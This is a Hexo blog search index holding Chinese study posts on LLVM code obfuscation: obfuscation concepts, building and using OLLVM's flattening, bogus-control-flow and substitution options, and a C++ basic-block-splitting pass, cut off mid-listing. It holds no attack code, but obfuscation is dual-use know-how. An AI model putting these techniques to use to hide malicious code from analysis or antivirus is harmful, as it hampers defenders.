<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>llvm代码混淆学习（五）</title>
      <link href="/posts/58008/"/>
      <url>/posts/58008/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/16107/"/>
      <url>/posts/16107/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm代码混淆学习（四）</title>
      <link href="/posts/8230/"/>
      <url>/posts/8230/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>随便学学 llvm 代码混淆，顺便做个毕设，水几篇文章就当做做笔记</p></blockquote><h1 id="代码混淆基本原理"><a href="#代码混淆基本原理" class="headerlink" title="代码混淆基本原理"></a>代码混淆基本原理</h1><h2 id="术语介绍"><a href="#术语介绍" class="headerlink" title="术语介绍"></a>术语介绍</h2><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>代码混淆是将计算机程序的代码，转换成一种功能上等价，但是难以阅读和理解的形式的行为。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213153958210.png" alt="image-20230213153958210"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数是代码混淆的基本单位，一个函数由若干个基本块组成，有且仅有一个入口块，可能有多个出口块。</p><p>一个函数可以用一个控制流图（Control Flow Graph，CFG）来表示。</p><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><p>基本块由一组线性指令组成，每一个基本块都有一个入口点（第一条执行的命令）和一个出口点（最后一条执行的指令，也即终结指令）。</p><p>终结指令要么跳转到另一个基本块（br，switch），要么从函数返回（ret）。</p><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p>控制流代表了一个程序在执行过程中可能遍历到的所有路径。</p><p>通常情况下，程序的控制流很清晰的反映了程序的逻辑，但经过混淆的控制流会使得人们难以分辨正常逻辑。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213212740892.png" alt="image-20230213212740892"></p><h3 id="不透明谓词"><a href="#不透明谓词" class="headerlink" title="不透明谓词"></a>不透明谓词</h3><p>不透明谓词指的是其值为混淆者明确知晓，但是反混淆者却难以推断的变量。</p><p>例如混淆者在程序中使用一个恒为 0 的全局变量，反混淆者难以推断这个变量恒为 0。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213212900831.png" alt="image-20230213212900831"></p><h2 id="常见的混淆思路"><a href="#常见的混淆思路" class="headerlink" title="常见的混淆思路"></a>常见的混淆思路</h2><h3 id="符号混淆"><a href="#符号混淆" class="headerlink" title="符号混淆"></a>符号混淆</h3><p>将函数的符号，如函数名、全局变量名去除或者混淆。对于 ELF 文件可以通过 strip 指令去除符号表完成。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213027766.png" alt="image-20230213213027766"></p><h3 id="控制流混淆"><a href="#控制流混淆" class="headerlink" title="控制流混淆"></a>控制流混淆</h3><p>控制流混淆指的是混淆程序的正常的控制流，使其在功能保持不变的情况下不能清晰的反映原本程序的正常逻辑。</p><p>经典的控制流混淆有：控制流平坦化、虚假控制流、随机控制流。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213132828.png" alt="image-20230213213132828"></p><h3 id="计算混淆"><a href="#计算混淆" class="headerlink" title="计算混淆"></a>计算混淆</h3><p>计算混淆指的是混淆程序的计算流程，或计算流程中使用的数据，使分析者难以分辨某一段代码所执行的具体计算。</p><p>经典的计算混淆有：指令替代、常量替代。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213235744.png" alt="image-20230213213235744"></p><h3 id="虚拟机混淆"><a href="#虚拟机混淆" class="headerlink" title="虚拟机混淆"></a>虚拟机混淆</h3><p>虚拟机混淆的思想是将一组指令集合（如一组 x86 指令），转化为一组攻击者未知的自定义指令集。并用与程序绑定的解释器解释执行。</p><p>经典虚拟机混淆：VMProtect</p><p>虚拟机混淆是目前最强力的混淆，但也有许多缺点：如性能损耗大、容易被杀毒软件报毒等。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213412543.png" alt="image-20230213213412543"></p><h1 id="OLLVM-使用"><a href="#OLLVM-使用" class="headerlink" title="OLLVM 使用"></a>OLLVM 使用</h1><p>Obfuscator-LLVM（简称OLLVM）是2010年6月由瑞士西部应用科学大学(HEIG-VD)的信息安全小组发 起的一个项目。 这个项目的目的是提供一个 LLVM 编译套件的开源分支，能够通过代码混淆和防篡改提 供更高的软件安全性。</p><p>OLLVM 提供了三种经典的代码混淆：</p><ul><li>控制流平坦化 Control Flow Flattening</li><li>虚假控制流 Bogus Control Flow</li><li>指令替代 Instruction Subsititution</li></ul><h2 id="Ubuntu-x2F-OLLVM-x2F-Docker-版本"><a href="#Ubuntu-x2F-OLLVM-x2F-Docker-版本" class="headerlink" title="Ubuntu&#x2F;OLLVM&#x2F;Docker 版本"></a>Ubuntu&#x2F;OLLVM&#x2F;Docker 版本</h2><ul><li>Ubuntu 16.04</li><li>OLLVM 4.0</li><li>Docker 20.10.7</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>第一步：安装 docker</p><p><a href="https://blog.csdn.net/qq_42376617/article/details/126389108">参考教程 点击直达</a></p><p>第二步：pull docker 容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nickdiego/ollvm-build</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124300406.png" alt="image-20230215124300406"></p><p>第三步：下载安装脚本和 OLLVM 源代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nickdiego/docker-ollvm.git</span><br><span class="line">git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124323394.png" alt="image-20230215124323394"></p><p>第四步：在 docker 容器上编译 OLLVM</p><p>在 <code>ollvm-build.sh</code> 的第 150 行加入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_COM+=<span class="string">&quot; -DLLVM_INCLUDE_TESTS=OFF&quot;</span></span><br></pre></td></tr></table></figure><p>关闭 llvm 的头文件测试，为了加快编译速度</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215124400504.png" alt="image-20230215124400504"></p><p>执行<code>ollvm-build.sh</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ollvm-build.sh</span><br><span class="line">sudo ./ollvm-build.sh ../obfuscator</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215141045340.png" alt="image-20230215141045340"></p><p>编译了快俩小时，编译完成后在<code>obfuscator/build_release</code>目录执行指令创建软链接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln ./bin/* /usr/bin/</span><br></pre></td></tr></table></figure><p>输入<code>clang --version</code>指令确定安装是否完成：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215141138975.png" alt="image-20230215141138975"></p><h2 id="测试文件-ida-分析"><a href="#测试文件-ida-分析" class="headerlink" title="测试文件 ida 分析"></a>测试文件 ida 分析</h2><p>清晰明了：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151112343.png" alt="image-20230215151112343"></p><p>流程简单：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151136939.png" alt="image-20230215151136939"></p><h2 id="控制流平坦化-Control-Flow-Flattening"><a href="#控制流平坦化-Control-Flow-Flattening" class="headerlink" title="控制流平坦化 Control Flow Flattening"></a>控制流平坦化 Control Flow Flattening</h2><p>可用选项：</p><ul><li><code>-mllvm -fla</code>：激活控制流平坦化</li><li><code>-mllvm -split</code>：激活基本块分割</li><li><code>-mllvm -split_num=3</code>：指定基本块分割的数目，这里指定一个基本块会被分割成三个基本块后再进行控制流平坦化混淆</li></ul><p>例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla -mllvm -split -mllvm -split_num=3 TestProgram.cpp -o TestProgram_fla</span><br></pre></td></tr></table></figure><p>在编译时可能出现<code>stddef.h</code>和<code>stdarg.h</code>两个头文件不存在的错误，可以使用<code>locate stddef.h</code>和<code>locate stdarg.h</code>指令找到这两个头文件的位置，然后复制到<code>/usr/include</code>或<code>usr/local/include</code>目录下</p><blockquote><p>使用<code> locate</code> 命令可以看到很多目录下都有<code>stddef.h</code>和<code>stdarg.h</code>这两个头文件，但是这两个头文件只能是复制<code>/usr/lib/gcc/x86_64-linux-gnu/5/include</code>这个目录下的，其他目录下的复制过去编译会报错</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215150703288.png" alt="image-20230215150703288"></p><p>编译得到文件，拖去 ida 看，熟悉的一坨</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215150919567.png" alt="image-20230215150919567"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151344546.png" alt="image-20230215151344546"></p><h2 id="虚假控制流-Bogus-Control-Flow"><a href="#虚假控制流-Bogus-Control-Flow" class="headerlink" title="虚假控制流 Bogus Control Flow"></a>虚假控制流 Bogus Control Flow</h2><p>可用选项：</p><ul><li><code>-mllvm -bcf</code>：激活虚假控制流</li><li><code>-mllvm -bcf_loop=3</code>：混淆次数，这里指定一个函数会被混淆三次，默认一次</li><li><code>-mllvm -bcf_prob=40</code>：每个基本块被混淆的概率，这里每个基本块被混淆的概率为40%，默认为30%</li></ul><p>例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 TestProgram.cpp -o TestProgram_bcf</span><br></pre></td></tr></table></figure><p>巨长一条：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151513361.png" alt="image-20230215151513361"></p><p>熟悉的表达式：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151554912.png" alt="image-20230215151554912"></p><h2 id="指令替代-Instruction-Subsititution"><a href="#指令替代-Instruction-Subsititution" class="headerlink" title="指令替代 Instruction Subsititution"></a>指令替代 Instruction Subsititution</h2><p>可用选项：</p><ul><li><code>-mllvm-sub</code>：激活指令替代</li><li><code>-mllvm -sub_loop=3</code>：混淆次数，这里指定一个函数会被混淆三次，默认一次</li></ul><p>例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -sub -mllvm -sub_loop=3 TestProgram.cpp -o TestProgram_sub</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151730797.png" alt="image-20230215151730797"></p><p>在计算表达式多的函数，如加密函数里，混淆的效果比较好：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215151755654.png" alt="image-20230215151755654"></p>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm代码混淆学习（三）</title>
      <link href="/posts/20199/"/>
      <url>/posts/20199/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>随便学学 llvm 代码混淆，顺便做个毕设，水几篇文章就当做做笔记</p></blockquote><h1 id="基本块分割"><a href="#基本块分割" class="headerlink" title="基本块分割"></a>基本块分割</h1><p>基本块分割即将一个基本块分割为等价的若干个基本块，在分割后的基本块之间加上无条件跳转。</p><p>基本块分割不能算是混淆，但是可以提高某些代码混淆的混淆效果。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005757996.png" alt="image-20230208005757996"></p><h2 id="为什么要分割"><a href="#为什么要分割" class="headerlink" title="为什么要分割"></a>为什么要分割</h2><p>在许多基于基本块的代码混淆中，基本块数量越多，代码混淆后的复杂度越大。</p><p>通过增加基本块的数量，可以到达提高混淆效果的目的。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005944236.png" alt="image-20230208005944236"></p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>遍历每个函数中的每个基本块，对每个基本块进行分割即可。</p><blockquote><p>有 PHI 指令的基本块选择跳过</p><p>因为 PHI 值根据前驱块指定，分割带有 PHI 指令的基本块可能会改变其前驱块，导致带有 PHI 指令的基本块的前驱块是分割前的同一个基本块</p></blockquote><h2 id="使用到的-API"><a href="#使用到的-API" class="headerlink" title="使用到的 API"></a>使用到的 API</h2><ul><li>额外参数指定</li></ul><p>可以通过 <strong>cl::opt</strong> 模板类获取指令中的参数，这里的 opt 是选项 option 的缩写，不是优化器的意思：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选的参数，指定一个基本块会被分裂成几个基本块，默认值为 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split &lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令：</span></span><br><span class="line">opt -load ../Build/LLVMObfuscator.so -split -split_num <span class="number">5</span> -S TestProgram.ll -o TestProgram_split.ll</span><br></pre></td></tr></table></figure><ul><li>splitBasicBlock 函数</li></ul><p>splitBasicBlock 函数是 BasicBlock 类的一个成员函数。在BasicBlock.h 头文件里可以看到这个函数的两种用法：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208143330733.png" alt="image-20230208143330733"></p><p>将一个基本块，在指令 I 处一分为二，指令 I 之前的指令会被放在第一个基本块里，包括指令 I 的后面指令 放到第二个基本块里，最后在第一个基本块里建立绝对跳转</p><p>有两种用法，区别在第一个参数，第一种用迭代器，第二种用指针。</p><p>第二个参数是字符串，指定分裂出来的新基本块名称。</p><p>第三个参数用于改变两个基本块的顺序，为<code>true</code>时，第二个基本块会放到第一个基本块之前</p><p>返回结果是指向第二个基本块（新）的指针</p><p>代码片段分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="comment">// 计算分裂后每个基本块的大小</span></span><br><span class="line">    <span class="type">int</span> splitSize = BB-&gt;<span class="built_in">size</span>() / splitNum;</span><br><span class="line">    <span class="keyword">if</span>(splitSize)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; splitNum;i ++)&#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">                <span class="keyword">if</span>(++cnt == splitSize)&#123;</span><br><span class="line">                    <span class="comment">// 在 I 指令处对基本块进行分割</span></span><br><span class="line">                    curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);<span class="comment">// 传递指令 I 的指针地址，非引用</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>isa &lt;&gt; 函数</li></ul><p>isa&lt;&gt; 是一个模板函数，用于判断一个指针指向的数据的类型是不是给定的类型，类似于 Java 中的 instanceof</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断基本块中是否存在 PHI 指令</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>Transforms<ul><li>include<ul><li>SplitBasicBlock.h</li></ul></li><li>src<ul><li>SplitBasicBlock.cpp</li></ul></li></ul></li></ul><h3 id="SplitBasicBlock-cpp"><a href="#SplitBasicBlock-cpp" class="headerlink" title="SplitBasicBlock.cpp"></a>SplitBasicBlock.cpp</h3><p>引入指令参数<code>splitNum</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可选的参数，指定一个基本块会被分裂成几个基本块，默认值为 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split&lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br></pre></td></tr></table></figure><p><code>SplitBasicBlock</code>类定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SplitBasicBlock</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">SplitBasicBlock</span>() : <span class="built_in">FunctionPass</span>(ID)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对单个基本块执行分裂操作</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">split</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断一个基本块中是否包含 PHI 指令（PHINode）</span></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">containsPHI</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>runOnFunction</code>函数实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 第一步：保存原先的所有基本块</span></span><br><span class="line">    vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 第二步：对每个不包含 PHI 指令的基本块执行分裂操作</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">containsPHI</span>(BB))&#123;</span><br><span class="line">            <span class="built_in">split</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>为什么要先把所有基本块保存到 vector 容器中</p><p>因为要对基本块进行分割操作，分割时基本块数量会增多，所以需要把原先所有基本块保存到一个 vector 容器中，在容器中进行分裂操作不会影响 foreach 遍历</p></blockquote><p><code>containsPHI</code>函数实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>split</code>函数实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 计算分裂后每个基本块的大小</span></span><br><span class="line">    <span class="comment">// 原基本块的大小 / 分裂数目（向上取整）</span></span><br><span class="line">    <span class="type">int</span> splitSize = (BB-&gt;<span class="built_in">size</span>() + splitNum - <span class="number">1</span>) / splitNum;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; splitNum;i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt++ == splitSize)&#123;</span><br><span class="line">                <span class="comment">// 在 I 指令处对基本块进行分割</span></span><br><span class="line">                curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化 ID 并注册：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> SplitBasicBlock::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;SplitBasicBlock&gt; <span class="title">x</span><span class="params">(<span class="string">&quot;split&quot;</span>, <span class="string">&quot;Split a basic block into multiple basic blocks.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span 